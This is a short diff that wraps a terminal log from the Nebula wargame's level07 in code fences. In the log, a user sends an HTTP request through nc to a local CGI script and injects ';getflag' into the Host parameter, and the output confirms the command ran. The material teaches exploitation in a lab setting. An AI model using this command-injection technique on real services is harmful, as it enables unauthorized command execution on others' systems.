@@ -1,3 +1,4 @@
+```
 level07@nebula:~$ echo -ne "GET /index.cgi?Host=localhost%3bgetflag\n\n" | nc localhost 7007
 Content-type: text/html
 
@@ -11,3 +12,4 @@ Content-type: text/html
 rtt min/avg/max/mdev = 0.017/0.030/0.037/0.009 ms
 You have successfully executed getflag on a target account
 </pre></body></html>
+```
